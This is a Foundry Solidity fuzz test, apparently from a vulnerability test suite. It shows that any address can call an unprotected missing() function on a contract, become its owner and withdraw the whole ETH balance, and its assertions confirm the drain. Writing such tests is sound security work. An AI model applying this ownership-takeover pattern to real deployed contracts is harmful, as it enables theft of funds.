
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {
    Missing_2 public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Missing_2();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude any privileged roles here because the vulnerability
        // is that the missing() function has NO access control at all.
        // Any arbitrary caller should be able to call it and become the owner.

        // --- 2. State Configuration ---
        
        // Fund the contract with some ETH to make the vulnerability impactful
        vm.deal(address(_contractUnderTest), 10 ether);
        
        // Fund the caller so they can potentially withdraw
        vm.deal(caller, 1 ether);

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY: Call the unprotected missing() function
        // This function lacks access control and allows anyone to become the owner
        _contractUnderTest.missing();

        // ASSERT SUCCESS: Verify the caller is now the owner by attempting to withdraw
        // If the caller successfully became the owner, they can now call withdraw()
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        _contractUnderTest.withdraw();
        
        // Verify the withdrawal succeeded (proving the caller became the owner)
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be 0 after withdrawal");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should have received the contract's balance");
    }
}
